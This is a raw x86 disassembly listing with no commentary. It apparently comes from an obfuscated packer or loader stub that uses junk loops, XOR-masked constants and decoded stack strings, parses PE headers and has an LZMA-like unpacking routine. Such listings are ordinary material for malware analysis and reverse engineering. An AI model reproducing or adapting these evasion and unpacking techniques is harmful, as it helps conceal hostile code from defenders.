  424f8b:	mov    eax,DWORD PTR [ebp-0x8]
  424f8e:	mov    esi,DWORD PTR [ebp+0x10]
  424f91:	xor    eax,edx
  424f93:	xor    ebx,ebx
  424f95:	add    esi,0xfabdbed8
  424f9b:	adc    ebx,0xffffffff
  424f9e:	lea    ecx,[ecx+eax*1+0x3272f1]
  424fa5:	xor    edi,edi
  424fa7:	xor    esi,0x8a29a13d
  424fad:	xor    ebx,0x0
  424fb0:	mov    eax,ecx
  424fb2:	add    eax,0xfabdbed8
  424fb7:	adc    edi,0xffffffff
  424fba:	xor    eax,0x8a29a13d
  424fbf:	xor    edi,0x0
  424fc2:	cmp    eax,esi
  424fc4:	jne    0x424f65
  424fca:	cmp    edi,ebx
  424fcc:	jne    0x424f65
  424fd2:	mov    eax,0xf89c85ba
  424fd7:	pop    ebx
  424fd8:	pop    edi
  424fd9:	pop    esi
  424fda:	leave  
  424fdb:	ret    0xc
  424fde:	push   ebp
  424fdf:	mov    ebp,esp
  424fe1:	push   ecx
  424fe2:	xor    ecx,0x1d8f
  424fe8:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  424fef:	mov    DWORD PTR ds:0x42a2a6,0x12
  424ff9:	cmp    DWORD PTR ds:0x42a2a6,0x0
  425000:	je     0x42503a
  425006:	cmp    DWORD PTR ds:0x42a2a6,0x14
  42500d:	jb     0x42503a
  425013:	jmp    0x425028
  425018:	push   0x42a2ee
  42501d:	push   0x429000
  425022:	call   DWORD PTR ds:0x42a3f2
  425028:	mov    edx,DWORD PTR ds:0x42a2a6
  42502e:	dec    edx
  42502f:	mov    DWORD PTR ds:0x42a2a6,edx
  425035:	jmp    0x424ff9
  42503a:	mov    eax,DWORD PTR [ebp+0x8]
  42503d:	adc    DWORD PTR ds:0x42a2ce,0x6bd6
  425047:	movsx  eax,BYTE PTR [eax]
  42504a:	adc    DWORD PTR ds:0x42a2ea,ebx
  425050:	mov    edx,0x3272f1
  425055:	and    DWORD PTR ds:0x42a2e6,0x2b27
  42505f:	sub    eax,edx
  425061:	mov    ecx,0x75108aa
  425066:	add    DWORD PTR ds:0x42a256,0x714
  425070:	xor    eax,ecx
  425072:	mov    DWORD PTR ds:0x42a2f6,0x37ad
  42507c:	cmp    eax,0xf89c85f6
  425081:	jne    0x4250b0
  425087:	mov    eax,DWORD PTR [ebp+0x8]
  42508a:	push   esi
  42508b:	mov    esi,DWORD PTR [ebp+0x8]
  42508e:	add    esi,DWORD PTR [eax+0x3c]
  425091:	mov    DWORD PTR [ebp+0x8],esi
  425094:	mov    eax,DWORD PTR [ebp-0x4]
  425097:	mov    esi,DWORD PTR [ebp+0x8]
  42509a:	xor    eax,ecx
  42509c:	add    eax,edx
  42509e:	cmp    DWORD PTR [esi+0x54],eax
  4250a1:	pop    esi
  4250a2:	je     0x4250b0
  4250a8:	mov    eax,DWORD PTR [ebp+0x8]
  4250ab:	jmp    0x4250b7
  4250b0:	mov    eax,DWORD PTR [ebp-0x4]
  4250b3:	xor    eax,ecx
  4250b5:	add    eax,edx
  4250b7:	leave  
  4250b8:	ret    0x4
  4250bb:	push   ebp
  4250bc:	mov    ebp,esp
  4250be:	sub    esp,0xc
  4250c1:	mov    DWORD PTR ds:0x42a25a,0x10
  4250cb:	cmp    DWORD PTR ds:0x42a25a,0x0
  4250d2:	je     0x42512d
  4250d8:	cmp    DWORD PTR ds:0x42a25a,0x7
  4250df:	jle    0x42512d
  4250e5:	jmp    0x4250ff
  4250ea:	push   0x3f8d
  4250ef:	push   0x4291fd
  4250f4:	push   0x4291fd
  4250f9:	call   DWORD PTR ds:0x42a3b6
  4250ff:	cmp    DWORD PTR ds:0x42a25a,0x8
  425106:	jne    0x425119
  42510c:	mov    edx,DWORD PTR ds:0x42a25a
  425112:	dec    edx
  425113:	mov    DWORD PTR ds:0x42a25a,edx
  425119:	xor    edx,edx
  42511b:	or     edx,DWORD PTR ds:0x42a25a
  425121:	dec    edx
  425122:	mov    DWORD PTR ds:0x42a25a,edx
  425128:	jmp    0x4250cb
  42512d:	push   esi
  42512e:	mov    esi,0xf89c85a5
  425133:	mov    DWORD PTR [ebp-0x8],esi
  425136:	mov    DWORD PTR [ebp-0x4],0xf89c85ba
  42513d:	mov    DWORD PTR ds:0x42a2b6,0x3461
  425147:	push   edi
  425148:	xor    DWORD PTR ds:0x42a256,0x42a262
  425152:	mov    eax,eax
  425154:	and    DWORD PTR ds:0x42a2aa,0x0
  42515e:	jmp    0x425172
  425163:	xor    edx,edx
  425165:	or     edx,DWORD PTR ds:0x42a2aa
  42516b:	inc    edx
  42516c:	mov    DWORD PTR ds:0x42a2aa,edx
  425172:	cmp    DWORD PTR ds:0x42a2aa,0x1c
  425179:	jae    0x4251c4
  42517f:	cmp    DWORD PTR ds:0x42a2aa,0x7
  425186:	jb     0x4251c4
  42518c:	jmp    0x4251a5
  425191:	push   DWORD PTR [ebp-0x20]
  425194:	push   0x42a2ea
  425199:	push   DWORD PTR [ebp-0x20]
  42519c:	push   DWORD PTR [ebp-0x20]
  42519f:	call   DWORD PTR ds:0x42a3f6
  4251a5:	cmp    DWORD PTR ds:0x42a2aa,0x6
  4251ac:	jne    0x4251bf
  4251b2:	mov    edx,DWORD PTR ds:0x42a2aa
  4251b8:	inc    edx
  4251b9:	mov    DWORD PTR ds:0x42a2aa,edx
  4251bf:	jmp    0x425163
  4251c4:	mov    eax,DWORD PTR [ebp-0x4]
  4251c7:	and    DWORD PTR ds:0x42a2ea,0x0
  4251d1:	jmp    0x4251e3
  4251d6:	mov    edx,DWORD PTR ds:0x42a2ea
  4251dc:	inc    edx
  4251dd:	mov    DWORD PTR ds:0x42a2ea,edx
  4251e3:	cmp    DWORD PTR ds:0x42a2ea,0x1e
  4251ea:	jae    0x425215
  4251f0:	cmp    DWORD PTR ds:0x42a2ea,0x25
  4251f7:	jbe    0x425215
  4251fd:	jmp    0x425210
  425202:	push   0x42919f
  425207:	push   DWORD PTR [ebp-0xc]
  42520a:	call   DWORD PTR ds:0x42a3ba
  425210:	jmp    0x4251d6
  425215:	mov    edi,DWORD PTR [ebp-0x8]
  425218:	mov    ecx,0x75108aa
  42521d:	xor    eax,ecx
  42521f:	xor    edi,ecx
  425221:	mov    edx,0x3272f1
  425226:	add    edi,edx
  425228:	add    eax,edx
  42522a:	imul   eax,edi
  42522d:	mov    edi,DWORD PTR [ebp+0xc]
  425230:	cmp    edi,eax
  425232:	je     0x425287
  425238:	mov    DWORD PTR [ebp-0xc],esi
  42523b:	mov    eax,DWORD PTR [ebp-0xc]
  42523e:	mov    esi,DWORD PTR [ebp+0xc]
  425241:	xor    eax,ecx
  425243:	lea    eax,[eax*8+0x1939800]
  42524a:	mov    eax,DWORD PTR [esi+eax*1]
  42524d:	mov    DWORD PTR [ebp+0xc],eax
  425250:	mov    eax,DWORD PTR [ebp-0x4]
  425253:	mov    esi,DWORD PTR [ebp-0x8]
  425256:	xor    eax,ecx
  425258:	xor    esi,ecx
  42525a:	add    esi,edx
  42525c:	add    eax,edx
  42525e:	imul   eax,esi
  425261:	mov    esi,DWORD PTR [ebp+0xc]
  425264:	cmp    esi,eax
  425266:	je     0x425287
  42526c:	mov    eax,DWORD PTR [ebp-0x4]
  42526f:	xor    eax,ecx
  425271:	mov    ecx,DWORD PTR [ebp+0xc]
  425274:	add    eax,edx
  425276:	imul   eax,ecx
  425279:	add    eax,DWORD PTR [ebp+0x8]
  42527c:	mov    DWORD PTR [ebp+0xc],eax
  42527f:	mov    eax,DWORD PTR [ebp+0xc]
  425282:	jmp    0x425298
  425287:	mov    eax,DWORD PTR [ebp-0x4]
  42528a:	mov    esi,DWORD PTR [ebp-0x8]
  42528d:	xor    esi,ecx
  42528f:	xor    eax,ecx
  425291:	add    esi,edx
  425293:	add    eax,edx
  425295:	imul   eax,esi
  425298:	pop    edi
  425299:	pop    esi
  42529a:	leave  
  42529b:	ret    0x8
  42529e:	add    BYTE PTR [eax],al
  4252a0:	add    BYTE PTR [eax],al
  4252a2:	add    BYTE PTR [eax],al
  4252a4:	leave  
  4252a5:	dec    edx
  4252a6:	jns    0x4252f5
  4252a8:	add    BYTE PTR [eax],al
  4252aa:	add    BYTE PTR [eax],al
  4252ac:	add    al,BYTE PTR [eax]
  4252ae:	add    BYTE PTR [eax],al
  4252b0:	xor    BYTE PTR [eax],al
  4252b2:	add    BYTE PTR [eax],al
  4252b4:	rcl    BYTE PTR [edx+0x2],0x0
  4252b8:	rol    BYTE PTR [esi+0x2],0x0
  4252bc:	add    BYTE PTR [eax],al
  4252be:	add    BYTE PTR [eax],al
  4252c0:	push   edx
  4252c1:	push   ebx
  4252c2:	inc    esp
  4252c3:	push   ebx
  4252c4:	push   esp
  4252c5:	(bad)  [eax+0x1c]
  4252c8:	fldcw  WORD PTR [ecx-0x657db407]
  4252ce:	gs sub edx,eax
  4252d1:	out    dx,al
  4252d2:	sti    
  4252d3:	lahf   
  4252d4:	add    DWORD PTR [eax],eax
  4252d6:	add    BYTE PTR [eax],al
  4252d8:	inc    esi
  4252d9:	cmp    bl,BYTE PTR [edi+edx*2+0x69]
  4252dd:	outs   dx,BYTE PTR ds:[esi]
  4252de:	outs   dx,DWORD PTR fs:[esi]
  4252e0:	ja     0x425355
  4252e2:	and    BYTE PTR [ecx+ebp*2+0x72],al
  4252e6:	pop    esp
  4252e7:	inc    esi
  4252e8:	imul   ebp,DWORD PTR [ebp+eiz*2+0x45],0x636578
  4252f0:	mov    edx,DWORD PTR [ebp-0x14]
  4252f3:	sub    esp,0x108
  4252f9:	push   ebx
  4252fa:	mov    eax,ebx
  4252fc:	xchg   ecx,eax
  4252fd:	mov    eax,DWORD PTR [ebp+0x8]
  425300:	cmp    eax,0xf89c85a5
  425305:	jne    0x4257bf
  42530b:	mov    eax,DWORD PTR [ebp+0xc]
  42530e:	cmp    eax,0xf89c85ba
  425313:	jne    0x4257bf
  425319:	mov    eax,DWORD PTR [ebp+0x24]
  42531c:	mov    DWORD PTR [ebp-0x4],eax
  42531f:	mov    eax,DWORD PTR [ebp-0x4]
  425322:	mov    eax,DWORD PTR [eax+0x1d8]
  425328:	mov    eax,DWORD PTR [eax]
  42532a:	mov    eax,DWORD PTR [eax]
  42532c:	mov    DWORD PTR [ebp-0x8],eax
  42532f:	mov    BYTE PTR [ebp-0x18],0x1a
  425333:	mov    BYTE PTR [ebp-0x17],0x1f
  425337:	mov    BYTE PTR [ebp-0x16],0x14
  42533b:	mov    BYTE PTR [ebp-0x15],0x4e
  42533f:	mov    BYTE PTR [ebp-0x14],0x4d
  425343:	mov    BYTE PTR [ebp-0x13],0x83
  425347:	mov    BYTE PTR [ebp-0x20],0x8
  42534b:	mov    BYTE PTR [ebp-0x1f],0xe
  42534f:	mov    BYTE PTR [ebp-0x1e],0x18
  425353:	mov    BYTE PTR [ebp-0x1d],0xd
  425357:	mov    BYTE PTR [ebp-0x1c],0x4e
  42535b:	mov    BYTE PTR [ebp-0x1b],0x4d
  42535f:	mov    BYTE PTR [ebp-0x1a],0x83
  425363:	mov    BYTE PTR [ebp-0x28],0xe
  425367:	mov    BYTE PTR [ebp-0x27],0x1b
  42536b:	mov    BYTE PTR [ebp-0x26],0x17
  42536f:	mov    BYTE PTR [ebp-0x25],0xa
  425373:	mov    BYTE PTR [ebp-0x24],0x1c
  425377:	mov    BYTE PTR [ebp-0x23],0x13
  42537b:	mov    BYTE PTR [ebp-0x22],0x14
  42537f:	mov    BYTE PTR [ebp-0x21],0x83
  425383:	xor    ecx,ecx
  425385:	lea    eax,[ebp+ecx*1-0x18]
  425389:	movzx  edx,BYTE PTR [eax]
  42538c:	xor    edx,0x7c
  42538f:	inc    edx
  425390:	inc    ecx
  425391:	mov    BYTE PTR [eax],dl
  425393:	cmp    ecx,0x6
  425396:	jb     0x425385
  425398:	xor    ecx,ecx
  42539a:	lea    eax,[ebp+ecx*1-0x20]
  42539e:	movzx  edx,BYTE PTR [eax]
  4253a1:	xor    edx,0x7c
  4253a4:	inc    edx
  4253a5:	inc    ecx
  4253a6:	mov    BYTE PTR [eax],dl
  4253a8:	cmp    ecx,0x7
  4253ab:	jb     0x42539a
  4253ad:	xor    ecx,ecx
  4253af:	lea    eax,[ebp+ecx*1-0x28]
  4253b3:	movzx  edx,BYTE PTR [eax]
  4253b6:	xor    edx,0x7c
  4253b9:	inc    edx
  4253ba:	inc    ecx
  4253bb:	mov    BYTE PTR [eax],dl
  4253bd:	cmp    ecx,0x8
  4253c0:	jb     0x4253af
  4253c2:	lea    eax,[ebp-0x2c]
  4253c5:	mov    DWORD PTR [ebp-0x8],eax
  4253c8:	mov    ecx,DWORD PTR [ebp-0x8]
  4253cb:	mov    eax,0x7113fccf
  4253d0:	mov    DWORD PTR [ecx],eax
  4253d2:	mov    ecx,DWORD PTR [ebp-0x2c]
  4253d5:	push   esi
  4253d6:	push   edi
  4253d7:	mov    esi,0x4e3e
  4253dc:	mov    ebx,0x3272f1
  4253e1:	cmp    ecx,eax
  4253e3:	jne    0x4254ae
  4253e9:	lea    eax,[esi+0x39]
  4253ec:	mov    WORD PTR [ebp-0x78],ax
  4253f0:	mov    eax,esi
  4253f2:	mov    WORD PTR [ebp-0x76],ax
  4253f6:	add    eax,0x33
  4253f9:	mov    WORD PTR [ebp-0x74],ax
  4253fd:	lea    eax,[esi-0xe]
  425400:	mov    WORD PTR [ebp-0x72],ax
  425404:	add    eax,0x4f
  425407:	mov    ecx,eax
  425409:	lea    eax,[esi-0x15]
  42540c:	mov    WORD PTR [ebp-0x66],ax
  425410:	mov    eax,esi
  425412:	mov    WORD PTR [ebp-0x64],ax
  425416:	add    eax,0xffffffec
  425419:	mov    WORD PTR [ebp-0x62],ax
  42541d:	mov    eax,0x443
  425422:	mov    WORD PTR [ebp-0x60],ax
  425426:	mov    eax,0x5674
  42542b:	mov    WORD PTR [ebp-0x5e],ax
  42542f:	mov    eax,0x6114
  425434:	mov    WORD PTR [ebp-0x5c],ax
  425438:	lea    eax,[ebp-0xe0]
  42543e:	push   eax
  42543f:	mov    eax,DWORD PTR [ebp+0xc]
  425442:	mov    edi,0x75108aa
  425447:	xor    eax,edi
  425449:	add    eax,ebx
  42544b:	push   eax
  42544c:	mov    WORD PTR [ebp-0x70],cx
  425450:	lea    ecx,[esi-0xa]
  425453:	mov    edx,ecx
  425455:	lea    eax,[ebp-0x78]
  425458:	push   eax
  425459:	mov    eax,DWORD PTR [ebp-0x4]
  42545c:	mov    eax,DWORD PTR [eax+0x198]
  425462:	mov    WORD PTR [ebp-0x6e],dx
  425466:	mov    edx,0x4f8a
  42546b:	mov    WORD PTR [ebp-0x6c],dx
  42546f:	mov    DWORD PTR [ebp-0x6a],0x4e7f4e35
  425476:	mov    DWORD PTR [ebp-0x5a],0x4e34f1e6
  42547d:	mov    DWORD PTR [ebp-0xe0],0x1
  425487:	mov    DWORD PTR [ebp-0xdc],0x255
  425491:	push   DWORD PTR [eax]
  425493:	mov    eax,DWORD PTR [ebp+0x10]
  425496:	call   eax
  425498:	mov    DWORD PTR [ebp-0x8],eax
  42549b:	mov    eax,DWORD PTR [ebp-0x8]
  42549e:	test   eax,eax
  4254a0:	je     0x4254b3
  4254a2:	xor    DWORD PTR ds:0x76586876,0x87687666
  4254ac:	jmp    0x4254b3
  4254ae:	mov    edi,0x75108aa
  4254b3:	mov    eax,DWORD PTR [ebp-0x4]
  4254b6:	mov    ecx,DWORD PTR [eax+0x18c]
  4254bc:	xor    eax,eax
  4254be:	cmp    DWORD PTR [ecx],eax
  4254c0:	jne    0x425732
  4254c6:	mov    ecx,DWORD PTR [ebp-0x4]
  4254c9:	mov    ecx,DWORD PTR [ecx+0x17c]
  4254cf:	mov    DWORD PTR [ecx],eax
  4254d1:	mov    ecx,DWORD PTR [ebp-0x4]
  4254d4:	mov    ecx,DWORD PTR [ecx+0x180]
  4254da:	mov    DWORD PTR [ecx],eax
  4254dc:	mov    eax,0x4e61
  4254e1:	mov    WORD PTR [ebp-0x9c],ax
  4254e8:	mov    eax,esi
  4254ea:	mov    WORD PTR [ebp-0x9a],ax
  4254f1:	mov    eax,0x4e71
  4254f6:	mov    WORD PTR [ebp-0x98],ax
  4254fd:	add    eax,0xffffffc0
  425500:	mov    WORD PTR [ebp-0x96],ax
  425507:	mov    eax,0x4f8e
  42550c:	mov    WORD PTR [ebp-0x94],ax
  425513:	mov    eax,0x4e32
  425518:	mov    WORD PTR [ebp-0x92],ax
  42551f:	add    eax,0x4d
  425522:	mov    WORD PTR [ebp-0x90],ax
  425529:	mov    eax,0x4e34
  42552e:	mov    WORD PTR [ebp-0x8e],ax
  425535:	mov    eax,esi
  425537:	mov    WORD PTR [ebp-0x8c],ax
  42553e:	mov    eax,0x4e35
  425543:	mov    WORD PTR [ebp-0x8a],ax
  42554a:	mov    eax,0x99f1
  42554f:	mov    WORD PTR [ebp-0x88],ax
  425556:	mov    eax,0x8d62
  42555b:	mov    WORD PTR [ebp-0x86],ax
  425562:	mov    eax,0xd66f
  425567:	mov    WORD PTR [ebp-0x84],ax
  42556e:	mov    eax,0xd783
  425573:	mov    WORD PTR [ebp-0x82],ax
  42557a:	mov    eax,0x2784
  42557f:	mov    WORD PTR [ebp-0x80],ax
  425583:	mov    eax,0x4784
  425588:	mov    WORD PTR [ebp-0x7e],ax
  42558c:	mov    eax,0x4e33
  425591:	push   0x8
  425593:	mov    WORD PTR [ebp-0x7c],ax
  425597:	mov    DWORD PTR [ebp-0x10],0xa171b0e
  42559e:	mov    DWORD PTR [ebp-0xc],0x8314131c
  4255a5:	lea    eax,[ebp-0x10]
  4255a8:	pop    ecx
  4255a9:	mov    dl,BYTE PTR [eax]
  4255ab:	xor    dl,0x7c
  4255ae:	inc    dl
  4255b0:	mov    BYTE PTR [eax],dl
  4255b2:	inc    eax
  4255b3:	dec    ecx
  4255b4:	jne    0x4255a9
  4255b6:	lea    eax,[ebp-0x10]
  4255b9:	mov    DWORD PTR [ebp-0xdc],eax
  4255bf:	lea    eax,[ebp-0xe0]
  4255c5:	push   eax
  4255c6:	mov    eax,DWORD PTR [ebp+0xc]
  4255c9:	xor    eax,edi
  4255cb:	add    eax,ebx
  4255cd:	push   eax
  4255ce:	mov    eax,DWORD PTR [ebp-0x4]
  4255d1:	add    eax,0x66
  4255d4:	push   eax
  4255d5:	mov    eax,DWORD PTR [ebp-0x4]
  4255d8:	mov    eax,DWORD PTR [eax+0x198]
  4255de:	mov    DWORD PTR [ebp-0xe0],0x1
  4255e8:	push   DWORD PTR [eax]
  4255ea:	mov    eax,DWORD PTR [ebp+0x10]
  4255ed:	call   eax
  4255ef:	mov    ecx,DWORD PTR [ebp+0x8]
  4255f2:	xor    ecx,edi
  4255f4:	add    ecx,ebx
  4255f6:	mov    DWORD PTR [ebp-0x8],eax
  4255f9:	cmp    eax,ecx
  4255fb:	jne    0x425616
  4255fd:	mov    eax,ds:0x33730bcc
  425602:	or     eax,0x22150bcf
  425607:	mov    ds:0x33730bcc,eax
  42560c:	add    eax,0x3372e92f
  425611:	mov    ds:0x33730bcc,eax
  425616:	mov    ecx,0x4e66
  42561b:	mov    eax,ecx
  42561d:	mov    WORD PTR [ebp-0x40],ax
  425621:	add    eax,0x5
  425624:	mov    edx,eax
  425626:	mov    WORD PTR [ebp-0x3e],dx
  42562a:	mov    edx,0x4f93
  42562f:	mov    WORD PTR [ebp-0x3c],dx
  425633:	add    edx,0xfffffff8
  425636:	mov    WORD PTR [ebp-0x3a],dx
  42563a:	mov    edx,0x4f8d
  42563f:	mov    WORD PTR [ebp-0x38],dx
  425643:	add    edx,0xfffffff3
  425646:	mov    WORD PTR [ebp-0x36],dx
  42564a:	mov    edx,0x4f87
  42564f:	mov    WORD PTR [ebp-0x34],dx
  425653:	mov    WORD PTR [ebp-0x32],cx
  425657:	mov    ecx,esi
  425659:	mov    WORD PTR [ebp-0x30],cx
  42565d:	lea    ecx,[edx-0x1]
  425660:	mov    edx,ecx
  425662:	mov    WORD PTR [ebp-0x54],dx
  425666:	mov    edx,eax
  425668:	mov    WORD PTR [ebp-0x52],dx
  42566c:	mov    edx,0x4e73
  425671:	mov    WORD PTR [ebp-0x50],dx
  425675:	mov    WORD PTR [ebp-0x4e],ax
  425679:	lea    eax,[edx-0x6]
  42567c:	mov    WORD PTR [ebp-0x4c],ax
  425680:	add    eax,0xfffffff3
  425683:	mov    WORD PTR [ebp-0x4a],ax
  425687:	lea    eax,[edx-0xc]
  42568a:	mov    WORD PTR [ebp-0x48],ax
  42568e:	mov    WORD PTR [ebp-0x46],cx
  425692:	mov    WORD PTR [ebp-0x44],si
  425696:	mov    eax,DWORD PTR [ebp+0x8]
  425699:	movzx  ecx,WORD PTR [ebp-0x54]
  42569d:	xor    eax,edi
  42569f:	add    eax,ebx
  4256a1:	xor    eax,ecx
  4256a3:	mov    WORD PTR [ebp-0x54],ax
  4256a7:	mov    eax,DWORD PTR [ebp+0x8]
  4256aa:	movzx  ecx,WORD PTR [ebp-0x40]
  4256ae:	xor    eax,edi
  4256b0:	add    eax,ebx
  4256b2:	xor    eax,ecx
  4256b4:	mov    WORD PTR [ebp-0x40],ax
  4256b8:	xor    eax,eax
  4256ba:	mov    WORD PTR [ebp-0xf4],ax
  4256c1:	mov    WORD PTR [ebp-0x108],ax
  4256c8:	mov    edi,DWORD PTR [ebp+0x24]
  4256cb:	lea    eax,[ebp-0xf4]
  4256d1:	lea    edx,[ebp-0x54]
  4256d4:	mov    DWORD PTR [ebp-0xe0],0x2
  4256de:	mov    DWORD PTR [ebp-0xdc],eax
  4256e4:	call   0x42811b
  4256e9:	mov    DWORD PTR [ebp-0xd8],eax
  4256ef:	lea    eax,[ebp-0xe0]
  4256f5:	push   eax
  4256f6:	mov    eax,DWORD PTR [ebp+0xc]
  4256f9:	xor    eax,0x75108aa
  4256fe:	add    eax,ebx
  425700:	push   eax
  425701:	lea    eax,[ebp-0x9c]
  425707:	push   eax
  425708:	push   DWORD PTR [ebp-0x8]
  42570b:	mov    eax,DWORD PTR [ebp+0x10]
  42570e:	call   eax
  425710:	mov    edi,DWORD PTR [ebp+0x24]
  425713:	lea    eax,[ebp-0x108]
  425719:	lea    edx,[ebp-0x40]
  42571c:	mov    DWORD PTR [ebp-0xdc],eax
  425722:	call   0x42811b
  425727:	mov    DWORD PTR [ebp-0xd8],eax
  42572d:	mov    edi,0x75108aa
  425732:	mov    eax,DWORD PTR [ebp+0x14]
  425735:	push   DWORD PTR [ebp-0x4]
  425738:	push   DWORD PTR [ebp+0x20]
  42573b:	push   DWORD PTR [ebp+0x1c]
  42573e:	push   DWORD PTR [ebp+0x18]
  425741:	push   DWORD PTR [ebp+0x10]
  425744:	push   DWORD PTR [ebp+0x8]
  425747:	push   DWORD PTR [ebp+0xc]
  42574a:	call   0x4269bc
  42574f:	test   eax,eax
  425751:	je     0x425795
  425753:	add    DWORD PTR [ebp-0x4],eax
  425756:	push   DWORD PTR [ebp-0x4]
  425759:	lea    esi,[ebp+0x4]
  42575c:	call   0x425bad
  425761:	mov    eax,DWORD PTR [ebp-0x4]
  425764:	mov    eax,DWORD PTR [eax+0x1c8]
  42576a:	mov    eax,DWORD PTR [eax]
  42576c:	xor    eax,edi
  42576e:	add    eax,ebx
  425770:	mov    eax,DWORD PTR [ebp-0x4]
  425773:	jne    0x42578b
  425775:	mov    ecx,DWORD PTR [ebp-0x4]
  425778:	mov    ecx,DWORD PTR [ecx+0x1cc]
  42577e:	push   DWORD PTR [ecx]
  425780:	mov    eax,DWORD PTR [eax+0x1e0]
  425786:	call   DWORD PTR [eax+0x28]
  425789:	jmp    0x425795
  42578b:	mov    eax,DWORD PTR [eax+0x17c]
  425791:	mov    eax,DWORD PTR [eax]
  425793:	add    DWORD PTR [esi],eax
  425795:	mov    eax,DWORD PTR [ebp-0x4]
  425798:	mov    eax,DWORD PTR [eax+0x1dc]
  42579e:	dec    DWORD PTR [eax]
  4257a0:	mov    ecx,DWORD PTR [ebp-0x4]
  4257a3:	mov    ecx,DWORD PTR [ecx+0x1d8]
  4257a9:	mov    eax,DWORD PTR [eax]
  4257ab:	lea    eax,[ecx+eax*4]
  4257ae:	mov    ecx,DWORD PTR [ebp-0x4]
  4257b1:	mov    ecx,DWORD PTR [ecx+0x17c]
  4257b7:	mov    eax,DWORD PTR [eax]
  4257b9:	mov    ecx,DWORD PTR [ecx]
  4257bb:	add    DWORD PTR [eax],ecx
  4257bd:	pop    edi
  4257be:	pop    esi
  4257bf:	pop    ebx
  4257c0:	leave  
  4257c1:	ret    0x20
  4257c4:	push   edi
  4257c5:	push   esi
  4257c6:	push   ebx
  4257c7:	push   ebp
  4257c8:	mov    ebp,esp
  4257ca:	mov    eax,DWORD PTR [ebp+0x24]
  4257cd:	add    DWORD PTR [ebp+0x28],eax
  4257d0:	push   eax
  4257d1:	cld    
  4257d2:	mov    esi,DWORD PTR [ebp+0x18]
  4257d5:	add    DWORD PTR [ebp+0x1c],esi
  4257d8:	push   esi
  4257d9:	mov    esi,DWORD PTR [ebp+0x14]
  4257dc:	lods   eax,DWORD PTR ds:[esi]
  4257dd:	xchg   edx,eax
  4257de:	push   edx
  4257df:	mov    cl,BYTE PTR [esi-0x2]
  4257e2:	or     eax,0xffffffff
  4257e5:	shl    eax,cl
  4257e7:	not    eax
  4257e9:	push   eax
  4257ea:	mov    cl,dh
  4257ec:	or     eax,0xffffffff
  4257ef:	shl    eax,cl
  4257f1:	not    eax
  4257f3:	push   eax
  4257f4:	add    cl,dl
  4257f6:	mov    edi,esi
  4257f8:	sub    esp,0xc
  4257fb:	sub    eax,eax
  4257fd:	inc    eax
  4257fe:	push   eax
  4257ff:	push   eax
  425800:	push   eax
  425801:	push   eax
  425802:	push   eax
  425803:	push   edi
  425804:	sub    esi,esi
  425806:	push   esi
  425807:	or     ebx,0xffffffff
  42580a:	mov    eax,0x300
  42580f:	shl    eax,cl
  425811:	lea    ecx,[eax+0x736]
  425817:	mov    eax,0x4000400
  42581c:	shr    ecx,1
  42581e:	rep stos DWORD PTR es:[edi],eax
  425820:	push   0x5
  425822:	pop    ecx
  425823:	call   0x425b0e
  425828:	loop   0x425823
  42582a:	lea    esi,[esi]
  42582c:	lea    edi,[edi]
  42582e:	mov    edi,DWORD PTR [ebp-0x4]
  425831:	mov    eax,DWORD PTR [ebp-0x10]
  425834:	sub    edi,DWORD PTR [ebp+0x24]
  425837:	and    eax,edi
  425839:	mov    DWORD PTR [ebp-0x18],eax
  42583c:	mov    al,0x0
  42583e:	call   0x425b26
  425843:	jne    0x4258de
  425849:	mov    cl,BYTE PTR [ebp-0xc]
  42584c:	and    edi,DWORD PTR [ebp-0x14]
  42584f:	shl    edi,cl
  425851:	sub    cl,0x8
  425854:	neg    cl
  425856:	shr    esi,cl
  425858:	pop    eax
  425859:	add    edi,esi
  42585b:	pop    esi
  42585c:	lea    edi,[edi+edi*2]
  42585f:	shl    edi,0x8
  425862:	cmp    al,0x7
  425864:	pop    edx
  425865:	lea    ecx,[esi+edi*2+0xe6c]
  42586c:	push   ecx
  42586d:	push   esi
  42586e:	mov    esi,0x100
  425873:	push   eax
  425874:	mov    al,0x1
  425876:	jb     0x4258ac
  425878:	mov    edi,DWORD PTR [ebp-0x4]
  42587b:	sub    edi,DWORD PTR [ebp-0x24]
  42587e:	movzx  edi,BYTE PTR [edi]
  425881:	mov    ebp,DWORD PTR [ebp-0x34]
  425884:	shl    edi,1
  425886:	mov    ecx,esi
  425888:	and    esi,edi
  42588a:	add    ecx,esi
  42588c:	lea    ebp,[ebp+ecx*2+0x0]
  425890:	call   0x425b45
  425895:	mov    ecx,eax
  425897:	shr    esi,0x8
  42589a:	and    ecx,0x1
  42589d:	cmp    esi,ecx
  42589f:	mov    esi,0x100
  4258a4:	jne    0x4258b4
  4258a6:	cmp    eax,esi
  4258a8:	jb     0x425881
  4258aa:	jmp    0x4258c0
  4258ac:	mov    ebp,DWORD PTR [ebp-0x34]
  4258af:	call   0x425b45
  4258b4:	inc    eax
  4258b5:	inc    esi
  4258b6:	sub    eax,0x1
  4258b9:	sub    esi,0x1
  4258bc:	cmp    eax,esi
  4258be:	jb     0x4258ac
  4258c0:	pop    edx
  4258c1:	inc    edx
  4258c2:	cmp    edx,0x5
  4258c5:	dec    edx
  4258c6:	mov    ecx,edx
  4258c8:	jb     0x4258d9
  4258ca:	inc    edx
  4258cb:	cmp    edx,0xb
  4258ce:	dec    edx
  4258cf:	mov    cl,0x4
  4258d1:	dec    cl
  4258d3:	jb     0x4258d9
  4258d5:	mov    cl,0x7
  4258d7:	dec    cl
  4258d9:	sub    edx,ecx
  4258db:	push   edx
  4258dc:	jmp    0x42592d
  4258de:	mov    al,0xc1
  4258e0:	dec    al
  4258e2:	call   0x425b36
  4258e7:	jne    0x4258fd
  4258e9:	pop    eax
  4258ea:	pop    edi
  4258eb:	pop    edx
  4258ec:	pop    ecx
  4258ed:	pop    edx
  4258ee:	pop    ecx
  4258ef:	push   DWORD PTR [esp]
  4258f2:	push   ecx
  4258f3:	push   edx
  4258f4:	mov    edx,0x664
  4258f9:	mov    cl,0x0
  4258fb:	jmp    0x425970
  4258fd:	mov    al,0xcd
  4258ff:	dec    al
  425901:	call   0x425b36
  425906:	jne    0x425936
  425908:	mov    al,0xf1
  42590a:	dec    al
  42590c:	call   0x425b26
  425911:	jne    0x425966
  425913:	pop    eax
  425914:	cmp    al,0x7
  425916:	mov    al,0x9
  425918:	jb     0x42591c
  42591a:	mov    al,0xb
  42591c:	push   eax
  42591d:	mov    esi,DWORD PTR [ebp-0x4]
  425920:	sub    esi,DWORD PTR [ebp-0x24]
  425923:	cmp    esi,DWORD PTR [ebp+0x24]
  425926:	jb     0x425afd
  42592c:	lods   al,BYTE PTR ds:[esi]
